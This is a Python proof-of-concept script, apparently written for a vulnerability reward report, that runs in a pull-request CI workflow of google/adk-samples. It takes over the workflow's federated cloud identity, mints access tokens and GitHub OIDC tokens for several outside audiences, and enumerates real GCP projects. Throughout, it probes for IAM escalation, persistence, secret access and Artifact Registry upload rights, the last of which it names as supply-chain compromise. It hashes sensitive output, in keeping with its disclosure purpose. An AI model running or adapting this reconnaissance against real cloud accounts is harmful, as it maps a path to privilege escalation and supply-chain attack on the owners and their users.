#!/usr/bin/env python3
"""
Read-only post-auth enumeration for OSS VRP follow-up on adk-samples.

SAFETY:
  - Workflow logs on public repos are world-readable.
  - Sensitive outputs (SA emails, member lists, full IAM policies) are
    HASHED, not printed. Only structural metadata (counts, role-name lists
    without members) is logged.
  - No data is exfiltrated, no GCP resources are modified.
  - All commands are read-only metadata reads.
  - Triagers with repo access can re-run this workflow to see verbose
    contents, or contact the reporter via the VRP private channel.
"""
import base64
import hashlib
import json
import os
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request


def hash_str(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8", errors="replace")).hexdigest()[:16]


def run_capture(cmd: str, timeout: int = 60) -> str:
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return (r.stdout + r.stderr)
    except Exception as e:
        return f"ERROR: {e}"


def report_redacted(label: str, output: str) -> None:
    print(f"\n--- {label} ---")
    print(f"  output_sha256_prefix: {hash_str(output)}")
    print(f"  output_byte_length: {len(output)}")
    print(f"  output_line_count: {len(output.splitlines())}")


print("=" * 64)
print("[PoC FOLLOWUP] adk-samples — read-only access boundary enumeration")
print("Public-log safety: sensitive contents HASHED, not printed.")
print(f"Repo:        {os.environ.get('GITHUB_REPOSITORY')}")
print(f"Run ID:      {os.environ.get('GITHUB_RUN_ID')}")
print(f"Event:       {os.environ.get('GITHUB_EVENT_NAME')}")
print(f"Actor:       {os.environ.get('GITHUB_ACTOR')}")
print(f"Project env: {os.environ.get('CLOUDSDK_CORE_PROJECT')}")
creds = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
print(f"Creds path:  {creds}")
print(f"Creds size:  {os.path.getsize(creds) if creds and os.path.exists(creds) else 'N/A'}")
print("=" * 64)

# ---------------------------------------------------------------------------
# 1. Token-mint proof — show that WIF actually exchanges for an access token.
#    Print only length + boolean, never the token itself.
# ---------------------------------------------------------------------------
print("\n--- [1] Token mint via WIF (length only) ---")
tok_out = run_capture("gcloud auth application-default print-access-token 2>/dev/null").strip()
print(f"  access_token_length:  {len(tok_out)}")
print(f"  mint_succeeded:       {len(tok_out) > 50}")
# Hashed prefix — proves to triagers we got a real token without disclosing it
print(f"  token_sha256_prefix:  {hash_str(tok_out) if tok_out else 'N/A'}")

# ---------------------------------------------------------------------------
# 2. SA identity — hashed (the email is sensitive metadata)
# ---------------------------------------------------------------------------
sa_out = run_capture('gcloud config list account --format="value(core.account)" 2>&1').strip()
report_redacted("[2] SA identity (hashed)", sa_out)
# Also dump auth list metadata (status only)
al_out = run_capture("gcloud auth list 2>&1")
report_redacted("[2b] gcloud auth list (hashed)", al_out)

# ---------------------------------------------------------------------------
# 3. Accessible projects — count only, no IDs printed
# ---------------------------------------------------------------------------
proj_out = run_capture('gcloud projects list --format="value(projectId)" 2>&1')
proj_lines = [ln for ln in proj_out.strip().splitlines() if ln.strip()]
print("\n--- [3] Accessible projects (count + hash, no IDs) ---")
print(f"  project_count: {len(proj_lines)}")
print(f"  list_sha256_prefix: {hash_str(proj_out)}")

# ---------------------------------------------------------------------------
# 4. IAM policy on adk-devops (already disclosed in original report).
#    Print: binding count + distinct role-name list (no members).
#    Role names are public GCP identifiers; members would be sensitive.
# ---------------------------------------------------------------------------
iam_out = run_capture(
    "gcloud projects get-iam-policy adk-devops --format=json 2>&1"
)
report_redacted("[4] adk-devops IAM policy (full hash)", iam_out)
try:
    iam = json.loads(iam_out)
    bindings = iam.get("bindings", [])
    roles = sorted({b.get("role", "?") for b in bindings})
    members_count = sum(len(b.get("members", [])) for b in bindings)
    print(f"  binding_count:  {len(bindings)}")
    print(f"  member_count:   {members_count}")
    print(f"  distinct_roles: {len(roles)}")
    for r in roles:
        print(f"    role: {r}")
except Exception as e:
    print(f"  parse_error_or_no_access: {e}")

# ---------------------------------------------------------------------------
# 4b. Identify which of those roles are bound to OUR specific federated SA.
#     Extract the SA email from the credential file (workload identity
#     external_account creds carry it in service_account_impersonation_url),
#     then client-side filter the IAM JSON. Only role names are printed; the
#     SA email itself is hashed.
# ---------------------------------------------------------------------------
print("\n--- [4b] Roles bound to OUR federated identity ---")
sa_email = None
sa_principal = None
try:
    if creds and os.path.exists(creds):
        with open(creds) as f:
            cred_doc = json.load(f)
        url = cred_doc.get("service_account_impersonation_url", "") or ""
        if "/serviceAccounts/" in url and ":generateAccessToken" in url:
            sa_email = url.split("/serviceAccounts/")[-1].split(":")[0]
        # Federated identity (no impersonation) — derive principal from
        # audience + sub. We already have the JWT sub from [6].
        aud = cred_doc.get("audience", "") or ""
        if not sa_email and "/workloadIdentityPools/" in aud:
            # principal:// form per WIF docs
            sa_principal = aud.replace(
                "//iam.googleapis.com/", "principal://iam.googleapis.com/"
            ) + "/subject/repo:google/adk-samples:pull_request"
    if sa_email:
        print(f"  sa_email_sha256_prefix: {hash_str(sa_email)}")
        print(f"  identity_kind: impersonated_service_account")
    elif sa_principal:
        print(f"  sa_principal_sha256_prefix: {hash_str(sa_principal)}")
        print(f"  identity_kind: federated_principal")
    else:
        print("  identity_extraction_failed: no impersonation_url or audience in cred file")
    if iam_out:
        iam = json.loads(iam_out)
        my_roles = set()
        for b in iam.get("bindings", []):
            for m in b.get("members", []):
                if (sa_email and sa_email in m) or (sa_principal and m == sa_principal):
                    my_roles.add(b.get("role"))
        print(f"  our_role_count: {len(my_roles)}")
        for r in sorted(my_roles):
            print(f"    our_role: {r}")
        if not my_roles:
            print("  note: no exact match; SA may be bound via group/parent — "
                  "broader-membership patterns:")
            for b in iam.get("bindings", []):
                for m in b.get("members", []):
                    if "serviceAccount:" in m or "principalSet:" in m or "principal:" in m:
                        # Print only the prefix kind (no email exposure)
                        kind = m.split(":")[0]
                        print(f"    binding_principal_kind: {kind}  role: {b.get('role')}")
                        break
except Exception as e:
    print(f"  enumeration_error: {type(e).__name__}: {e}")

# ---------------------------------------------------------------------------
# 5. Artifact Registry IAM — does the SA have write/admin on starter-pack?
#    Read-only metadata. If write perm exists, this is supply-chain RCE
#    across the agent-starter-pack ecosystem.
# ---------------------------------------------------------------------------
ar_out = run_capture(
    "gcloud artifacts repositories get-iam-policy starter-pack "
    "--location=europe-west4 --project=production-ai-template "
    "--format=json 2>&1"
)
report_redacted(
    "[5] AR IAM starter-pack@production-ai-template (full hash)", ar_out
)
try:
    ar_iam = json.loads(ar_out)
    bindings = ar_iam.get("bindings", [])
    roles = sorted({b.get("role", "?") for b in bindings})
    write_roles = [
        r for r in roles
        if any(x in r.lower() for x in ("write", "admin", "create", "owner"))
    ]
    print(f"  binding_count:    {len(bindings)}")
    print(f"  distinct_roles:   {len(roles)}")
    print(f"  write_role_count: {len(write_roles)}")
    for r in roles:
        marker = "  [WRITE]" if r in write_roles else ""
        print(f"    role: {r}{marker}")
except Exception as e:
    print(f"  parse_error_or_no_access: {e}")

# Try to list repos in production-ai-template (count only)
ar_repos_out = run_capture(
    "gcloud artifacts repositories list --project=production-ai-template "
    '--format="value(name)" 2>&1'
)
ar_repo_lines = [ln for ln in ar_repos_out.strip().splitlines() if ln.strip()]
print(f"\n--- [5b] AR repos accessible in production-ai-template ---")
print(f"  repo_count: {len(ar_repo_lines)}")
print(f"  list_sha256_prefix: {hash_str(ar_repos_out)}")

# ---------------------------------------------------------------------------
# 6. OIDC JWT claim dump — re-mint the GitHub OIDC token for an arbitrary
#    audience and print the trust-relevant claims. These claims are
#    deterministic for this repo+workflow and reveal what other federated
#    services (AWS IAM, Vault, npm provenance, Azure, etc.) would trust if
#    misconfigured to accept this repo's tokens.
# ---------------------------------------------------------------------------
oidc_url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
oidc_tok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
if oidc_url and oidc_tok:
    print("\n--- [6] OIDC JWT claims (audience=oss-vrp-poc) ---")
    try:
        req = urllib.request.Request(
            f"{oidc_url}&audience=oss-vrp-poc",
            headers={"Authorization": f"Bearer {oidc_tok}"},
        )
        body = urllib.request.urlopen(req, timeout=15).read()
        jwt = json.loads(body)["value"]
        payload_b64 = jwt.split(".")[1]
        # pad
        payload_b64 += "=" * (-len(payload_b64) % 4)
        claims = json.loads(base64.urlsafe_b64decode(payload_b64))
        for k in (
            "iss", "aud", "sub", "repository", "repository_owner",
            "repository_owner_id", "repository_id", "workflow", "workflow_ref",
            "ref", "ref_type", "head_ref", "base_ref", "event_name",
            "actor", "actor_id", "job_workflow_ref", "runner_environment",
        ):
            if k in claims:
                print(f"  {k}: {claims[k]}")
    except Exception as e:
        print(f"  ERROR: {e}")
else:
    print("\n--- [6] OIDC JWT claims --- SKIPPED (env vars not present)")

# ---------------------------------------------------------------------------
# 6b. OIDC JWT for additional audiences — show what other federated trusts
#     (AWS, Azure, npm provenance, Vault) would see. Just dump aud/sub.
# ---------------------------------------------------------------------------
if oidc_url and oidc_tok:
    print("\n--- [6b] OIDC JWT for additional audiences (aud + sub only) ---")
    for aud in (
        "sts.amazonaws.com",
        "api://AzureADTokenExchange",
        "https://nuget.pkg.github.com",
        "https://vault.example.com",
        "npm",
    ):
        try:
            req = urllib.request.Request(
                f"{oidc_url}&audience={urllib.parse.quote(aud)}",
                headers={"Authorization": f"Bearer {oidc_tok}"},
            )
            body = urllib.request.urlopen(req, timeout=10).read()
            jwt = json.loads(body)["value"]
            payload_b64 = jwt.split(".")[1]
            payload_b64 += "=" * (-len(payload_b64) % 4)
            claims = json.loads(base64.urlsafe_b64decode(payload_b64))
            print(f"  requested_aud={aud!r:40}  issued_aud={claims.get('aud')!r}  sub={claims.get('sub')!r}")
        except Exception as e:
            print(f"  requested_aud={aud!r:40}  ERROR={type(e).__name__}: {e}")

# ---------------------------------------------------------------------------
# 7. testIamPermissions probes — GCP's purpose-built capability check API.
#    Asks "do I have permission X?" without exercising it. Returns a list of
#    permissions you actually have from the list you ask about. Read-only.
#    This converts "role X exists in project" (from [4]) into "the federated
#    SA confirmed has permission Y" (concrete capability).
# ---------------------------------------------------------------------------
print("\n--- [7] testIamPermissions probes (GCP capability discovery) ---")

ACCESS_TOKEN = run_capture(
    "gcloud auth application-default print-access-token 2>/dev/null"
).strip()

if not ACCESS_TOKEN or len(ACCESS_TOKEN) < 50:
    print("  SKIPPED — no access token to probe with")
else:
    def probe(label: str, url: str, perms: list) -> None:
        try:
            req = urllib.request.Request(
                url,
                data=json.dumps({"permissions": perms}).encode(),
                headers={
                    "Authorization": f"Bearer {ACCESS_TOKEN}",
                    "Content-Type": "application/json",
                },
                method="POST",
            )
            body = urllib.request.urlopen(req, timeout=15).read()
            granted = json.loads(body).get("permissions", [])
            print(f"\n  [{label}]")
            print(f"    requested: {len(perms)} permissions")
            print(f"    granted:   {len(granted)} of {len(perms)}")
            for p in perms:
                marker = "GRANTED" if p in granted else "denied "
                print(f"      [{marker}] {p}")
        except urllib.error.HTTPError as e:
            err_body = e.read().decode("utf-8", errors="replace")[:300]
            print(f"\n  [{label}]  HTTP {e.code}: {err_body}")
        except Exception as e:
            print(f"\n  [{label}]  ERROR: {type(e).__name__}: {e}")

    # 7.1 — Persistence + escalation primitives on adk-devops project
    probe(
        "adk-devops :: IAM persistence/escalation",
        "https://cloudresourcemanager.googleapis.com/v3/projects/adk-devops:testIamPermissions",
        [
            "iam.workloadIdentityPools.create",
            "iam.workloadIdentityPoolProviders.create",
            "iam.serviceAccounts.create",
            "iam.serviceAccountKeys.create",
            "iam.roles.create",
            "resourcemanager.projects.setIamPolicy",
            "iam.serviceAccounts.actAs",
            "iam.serviceAccounts.getAccessToken",
        ],
    )

    # 7.2 — Resource creation in adk-devops
    probe(
        "adk-devops :: resource creation",
        "https://cloudresourcemanager.googleapis.com/v3/projects/adk-devops:testIamPermissions",
        [
            "cloudbuild.builds.create",
            "aiplatform.endpoints.create",
            "aiplatform.models.upload",
            "storage.buckets.create",
            "storage.objects.create",
            "secretmanager.secrets.create",
            "secretmanager.versions.access",
            "run.services.create",
            "compute.instances.create",
        ],
    )

    # 7.3 — Supply-chain primitive on the AR repo we're pulling from
    probe(
        "AR :: starter-pack@production-ai-template (SUPPLY CHAIN)",
        "https://artifactregistry.googleapis.com/v1/projects/production-ai-template/locations/europe-west4/repositories/starter-pack:testIamPermissions",
        [
            "artifactregistry.repositories.uploadArtifacts",
            "artifactregistry.versions.delete",
            "artifactregistry.tags.update",
            "artifactregistry.tags.delete",
            "artifactregistry.tags.create",
            "artifactregistry.repositories.update",
            "artifactregistry.repositories.setIamPolicy",
        ],
    )

    # 7.4 — Cross-project escalation extent (production-ai-template)
    probe(
        "production-ai-template :: cross-project escalation",
        "https://cloudresourcemanager.googleapis.com/v3/projects/production-ai-template:testIamPermissions",
        [
            "resourcemanager.projects.get",
            "resourcemanager.projects.setIamPolicy",
            "iam.workloadIdentityPools.create",
            "iam.serviceAccounts.create",
            "iam.serviceAccountKeys.create",
            "cloudbuild.builds.create",
            "secretmanager.versions.access",
            "storage.buckets.create",
        ],
    )

# ---------------------------------------------------------------------------
# 8. Resource enumeration — names only, no content.
# ---------------------------------------------------------------------------
print("\n--- [8] Resource enumeration (names only, no object content) ---")

for label, cmd in (
    ("buckets@adk-devops",
     "gcloud storage buckets list --project=adk-devops --format='value(name)' 2>&1"),
    ("secrets@adk-devops (NAMES ONLY, no values accessed)",
     "gcloud secrets list --project=adk-devops --format='value(name)' 2>&1"),
    ("run-services@adk-devops",
     "gcloud run services list --project=adk-devops --format='value(metadata.name)' 2>&1"),
    ("recent-builds@adk-devops",
     "gcloud builds list --project=adk-devops --limit=5 --format='value(id)' 2>&1"),
    ("buckets@production-ai-template",
     "gcloud storage buckets list --project=production-ai-template --format='value(name)' 2>&1"),
    ("ar-repos@production-ai-template",
     "gcloud artifacts repositories list --project=production-ai-template --format='value(name)' 2>&1"),
):
    out = run_capture(cmd, timeout=30)
    lines = [ln for ln in out.strip().splitlines() if ln.strip()]
    is_error = any(s in out for s in ("ERROR:", "PERMISSION_DENIED", "denied", "Forbidden"))
    print(f"\n  [{label}]")
    if is_error and len(lines) < 5:
        print(f"    access_check: DENIED or ERROR  (output_sha256={hash_str(out)})")
        print(f"    first_line: {lines[0][:120] if lines else '(empty)'}")
    else:
        print(f"    access_check: GRANTED  count={len(lines)}  list_sha256={hash_str(out)}")

print("\n" + "=" * 64)
print("[PoC FOLLOWUP] END")
print("No data exfiltrated. No resources modified. No tokens leaked.")
print("Sensitive contents are hashed; structural metadata only is logged.")
print("Triagers may re-run this workflow to view verbose outputs, or")
print("contact reporter via the VRP private channel for raw logs.")
print("=" * 64)
